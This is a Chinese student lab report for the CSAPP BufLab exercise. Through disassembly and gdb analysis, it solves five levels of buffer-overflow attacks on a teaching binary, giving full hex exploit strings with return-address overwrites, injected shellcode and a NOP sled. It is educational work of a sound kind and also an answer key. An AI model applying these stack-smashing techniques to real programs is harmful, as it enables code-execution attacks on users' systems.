`CSAPP` -深入理解计算机系统实验报告(`BuffLab`)

课 程 名 称：     <u>深入理解计算机系统</u>

实验项目名称：<u>`BuffLab`</u>

专 业 班 级：     <u>软件1902</u>     

姓    名：            <u>侯茱元</u>     

学    号：            <u>201926010214</u>

指 导 教 师：      <u>杨科华</u>

完 成 时 间：      <u>2021 年 5 月 10 日</u>

## 简介🎨

`bufflab`在本实验中，将获得一种通常用于利用操作系统和网络服务器中的安全漏洞的方 法的第一手经验。目的是帮助了解程序的运行时操作，并了解这种形式的安全漏 洞的性质，以便在编写系统代码时可以避免这种情况。

## 所用工具🛠

* `objdump`-用于反汇编二进制对象文件

* `VS Code`-用于查看反汇编后的结果与文本文件的编写(此处所使用的`Ubuntu`版本为`16.04 -i386` 最后的`Ubuntu` 32位发行版，故支持`VS Code`)

* `gdb`-用于运行时单步调试与查看运行时内存与寄存器信息

## 解题过程🧐

### 开始🙃

下载解压实验源文件，产生需要解决的可执行文件和一个实验指导。多谢老师随题目附赠一个解决问题的教程。

#### `level_0`😊

* 关键函数

  根据汇编指令 `lea -0x28(%ebp)`,`%eax mov %eax,(%esp)`可知，函数` Gets `将输入的 字符存储到该处，向上存储字符。`0x28 `转换为十进制为 40，所以该字符串距离`%ebp `有 40 字节，又因为函数返回地址为` 0x4(%ebp)`,所以，应该输入 44 字节的 00，然 后再输入要跳转的函数的地址，即可覆盖掉` getbuf `的返回地址。

  ![image-20210601110650149](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601110650149.png)

  ![image-20210601110736118](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601110736118.png)


* 分析


  * 通过查看 `getbuf` 函数的汇编代码可知：`Gets` 函数输入字符串的地址相对于存放 `getbuf` 函数返回地址的位置的偏移为：`0x28 + 4`
  * `smoke` 函数的起始地址为：`0x08048e0a`，但是输入`0a`为换行，故选择第二行地址`0x08048e0b`

* `Answer`

  ```text
  00 00 00 00 00 00 00 00 00 00 /* 前44字节 随机 */
  00 00 00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00 00 00
  00 00 00 00 0b 8e 04 08  /* getbuf_fun's ret_address */
  ```

* 测试

  ![image-20210601112355162](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601112355162.png)

#### `level_1`👨‍🚀

* 关键函数

  ![image-20210601113222602](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601113222602.png)

* 分析

  * 可以发现有三个立即数，一个是用来与` 0x8(%ebp)`(即传入的第一个参数)比较的 `0x804d104`,另外两个是用于输出的 `0x0804a2e0`,和 `0x0804a4d4`,根据 `jne `指令可知， 如果传入的参数和` 0x804d104 `处相等的话，就输出 `0x0804a2e0` 这里的值，否则输 出 `0x0804a4d4` 的值：
    * ![image-20210601113837057](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601113837057.png)
  * 所以，传入的参数应该和 cookie 相等。 根据 `level0` 得到的经验，首先要将返会地址覆盖，改为 `08048daf`，即 fizz 的地址， 然后应该继续向上覆盖。值得注意的是，返回后 `0x8(%ebp)`这里变为了%esp，而进 入 fizz 函数后，第一条指令为 push `%ebp `然后是` mov %esp %ebp` 所以，对于函数 fizz 来说，其` 0x8(%ebp)`其实是变化之前的` 0x4(%esp)`的地方。
  * 所以，输入应该先有 44 字节 00，然后是 4 字节的返回地址，然后是 4 字节的 00， 然后是 4 字节的 cookie

* `Answer`

  ```text
  00 00 00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00 00 00
  00 00 00 00
  af 8d 04 08 //retaddr 
  00 00 00 00
  44 eb 3c 7d //cookie
  ```

  测试

  ![image-20210601114319381](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601114319381.png)

#### `level_2`😏

任务是让` BUFBOMB `执行 bang 代码， 而不是返回 test。但是，在此之前，您必须将全局变量 global_value 设置为用户 ID 的 Cookie。应设置 global_value，将 bang 的地址压入堆栈，然后执行` ret `指令以使 跳转到 bang 的代码。

* 关键函数

  ![image-20210601114643811](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601114643811.png)

* 分析

  * 可以发现有四个立即数 `0x0804d10c`、`0x0804d104`、`0x0804a4ac `和 `0x0804a2c2` 使用 `gdb` 查看这四个立即数
    * ![image-20210601115005314](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601115005314.png)
    * 根据汇编代码，可以得出，要将 global_value 与 cookie 比较，相等的话就通过，否 则过关失败。
    * 首先构建一个将` globa_value` 赋值为 cookie 的机器语言。这里选择使用汇编代码转为机器代码,并获得这些指令
      * ![image-20210601123015834](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601123015834.png)
    * 再获得这些指令后，需要让机器去执行它。这里可以将它看为一个函数，用之前那 种覆盖` getbuf `返回地址的方法来执行它。通过 `gdb` 调试，将断点定到`*0x0804926e`， 然后查看`%eax` :
      * ![image-20210601122035139](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601122035139.png)
    * 则` 0x55683528` 即为要使用的地址，即自己所写“函数”的地址。 像之前一样，需要先输入 44 个字节，然后再输入 4 个字节的返回地址。自己编写 的那段代码可以放到 44 字节的前部。

* `Answer`

  ```text
  c7 05 0c d1 04
  08 44 eb 3c 7d
  68 52 8d 04 08
  c3 00 00 00 00
  00 00 00 00 00
  00 00 00 00 00
  00 00 00 00 00
  00 00 00 00 00
  00 00 00 00
  28 35 68 55
  ```

* 测试

  ![image-20210601123100761](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601123100761.png)

#### `level_3`😮

根据作者的攻略，该任务中我们将修复这些被我们破坏的栈状态信息，让最后还 是回到 test 中，让被攻击者不容易发现我们动了手脚，而我们还要把 test 调用的` getbuf` 的返回值由` 0x1` 改成我们的 cookie 简单的说就是，首先要保证函数` getbuf` 可以正常返回，即返回地址和`%ebp` 的值要 不变，其此要将函数 `getbuf `的返回值改为 cookie 

* 关键函数

  * ![image-20210601123256282](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601123256282.png)
  * ![image-20210601123813305](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601123813305.png)

* 分析

  * 要获得正确的`%ebp` 的值，应该将断点设置在`*0x08049263` 处 使用` gdb` 查看可得
    * ![image-20210601123540280](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601123540280.png)
    * 因此，最后`%ebp` 的值应该设为 `0x55683580` ,返回查看 test 函数，可得到` getbuf` 函数的返回地址应该为 `0x08048e50`
    * 利用` level2` 的思路，自己使用汇编语言编写一段“函数”，实现对返回值即 对`%eax `以及`%ebp` 的赋值。对`%ebp `的赋值也可以在向上覆盖时完成
      * ![image-20210601125843782](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601125843782.png)

* `Answer`

  ```text
  b8 44 eb 3c 7d
  bd 80 35 68 55
  68 50 8e 04 08
  c3 00 00 00 00
  00 00 00 00 00
  00 00 00 00 00
  00 00 00 00 00
  00 00 00 00 00
  00 00 00 00
  28 35 68 55
  ```

* 测试

  * ![image-20210601125911405](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601125911405.png)

#### `level_4`😇

根据作者的攻略，在这一关中将用到函数 `getbufn` 该函数类似于` getbuf`，不同之处在于它具有 512 个字符的缓冲区。您将需要这个额 外的空间来创建可靠的漏洞利用程序。首先调用 `getbufn` 的代码在堆栈上分配了随 机数量的存储，因此，如果在两次连续执行 `getbufn` 的过程中对`％ebp `的值进行采 样，您会发现它们之间的差异可能最大为±240。另外，在 `Nitro` 模式下运行时， `BUFBOMB`要求您提供 5 次字符串，并且它将执行` getbufn `5 次，每次具有不同的 堆栈偏移量。您的漏洞利用字符串必须使它们每次都返回您的 cookie。漏洞利用 代码应将 cookie 设置为返回值，还原任何损坏的状态，将正确的返回位置压入堆 栈，并执行` ret `指令以真正返回到` testn`。 这一题和` level3`非常相似，区别在于，这一题要进行 5 次测试，并且`%ebp` 的值是 动态的，不是固定的。这就意味着，不能使用立即数对`%ebp` 进行赋值，应该寻找 其与其他变量的关系，依靠这个关系，对其赋值。

* 关键函数

  * ```assembly
    08048cce <testn>:
     8048cce:	55                   	push   %ebp
     8048ccf:	89 e5                	mov    %esp,%ebp
     8048cd1:	53                   	push   %ebx
     8048cd2:	83 ec 24             	sub    $0x24,%esp
     8048cd5:	e8 3e ff ff ff       	call   8048c18 <uniqueval>
     8048cda:	89 45 f4             	mov    %eax,-0xc(%ebp)
     8048cdd:	e8 62 05 00 00       	call   8049244 <getbufn>
     8048ce2:	89 c3                	mov    %eax,%ebx
     8048ce4:	e8 2f ff ff ff       	call   8048c18 <uniqueval>
     8048ce9:	8b 55 f4             	mov    -0xc(%ebp),%edx
     8048cec:	39 d0                	cmp    %edx,%eax
     8048cee:	74 16                	je     8048d06 <testn+0x38>
     8048cf0:	c7 44 24 04 60 a4 04 	movl   $0x804a460,0x4(%esp)
     8048cf7:	08 
     8048cf8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
     8048cff:	e8 8c fc ff ff       	call   8048990 <__printf_chk@plt>
     8048d04:	eb 46                	jmp    8048d4c <testn+0x7e>
     8048d06:	3b 1d 04 d1 04 08    	cmp    0x804d104,%ebx
     8048d0c:	75 26                	jne    8048d34 <testn+0x66>
     8048d0e:	89 5c 24 08          	mov    %ebx,0x8(%esp)
     8048d12:	c7 44 24 04 8c a4 04 	movl   $0x804a48c,0x4(%esp)
     8048d19:	08 
     8048d1a:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
     8048d21:	e8 6a fc ff ff       	call   8048990 <__printf_chk@plt>
     8048d26:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
     8048d2d:	e8 4e 05 00 00       	call   8049280 <validate>
     8048d32:	eb 18                	jmp    8048d4c <testn+0x7e>
     8048d34:	89 5c 24 08          	mov    %ebx,0x8(%esp)
     8048d38:	c7 44 24 04 a6 a2 04 	movl   $0x804a2a6,0x4(%esp)
     8048d3f:	08 
     8048d40:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
     8048d47:	e8 44 fc ff ff       	call   8048990 <__printf_chk@plt>
     8048d4c:	83 c4 24             	add    $0x24,%esp
     8048d4f:	5b                   	pop    %ebx
     8048d50:	5d                   	pop    %ebp
     8048d51:	c3                   	ret 
    ```

  * ![image-20210601133431214](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601133431214.png)

* 分析

  * 首先找到 `getbufn` 的返回地址为 `0x08048ce2`
  * 然后发现，对于` testn` 函数来说其`%ebp` 和`%esp` 直接的关系是确定的。
    * 首先，通过 `mov %esp,%ebp` 此时它们是相等的，然后 `push %ebx`此时`%esp+0x4=%ebp`, 最后 `sub $0x24,%esp` 此时`%esp+0x28=%ebp`。所以，在 `getbufn` 函数执行完 `ret` 后， 得到的`%ebp `等于 `0x28+%esp`。这样就找到了等量关系。
  * 查看 `getbufn `的汇编代码,从 `lea -0x208(%ebp),%eax `可以看出，字符串的首地址为`%ebp-0x208` 即十进制的 520，所以，就像前面的一样，要覆盖 524 个字节，然后覆盖返回值。总共 528 个 字节。
  * 使用 `gdb` 查看 5 次运行时`-0x208(%ebp)`的值，断点设为`*0x08049253`
    * ![image-20210601134930137](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601134930137.png)
    * ![image-20210601135013311](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601135013311.png)
  * 选择最大的 `0x55683388` 作为其首地址，然后其他使用 90 即` nop` 指令填充即可， 然后将之前得到的机器指令放到最后即可。这样即使首地址比这个小，也会执行 `nop `指令，最终一定会执行编写的那几条机器指令。 所以输入如下，509 个 90，然后是 15 字节的机器指令，最后为 4 字节的地址
  * 设计汇编代码，来实现对`%ebp` 的还原和返回地址的还原，以及返回值的更改。
    * ![image-20210601135634010](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601135634010.png)

* `Answer`

  * ```text
    90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
    90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
    90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
    90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
    90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
    90 90 90 90 90 90 90 90 90
    b8 44 eb 3c 7d
    8d 6c 24 28
    68 e2 8c 04 08
    c3
    88 33 68 55
    ```

* 测试

  * ![image-20210601140111732](https://gitee.com/Monkeyman520/MonkeyImgURL/raw/master/img/image-20210601140111732.png)

## 总结😎

至此，本次实验就稀里糊涂得完成了，虽然还是有些不明白，但是都是自己认真思考得出的解决方案，还是有很多不完善得地方，路漫漫其修远兮，真难啊，但是收获也很大，学会了好多东西，看汇编得能力也提升了不少，但是还不够，需要继续努力！🛫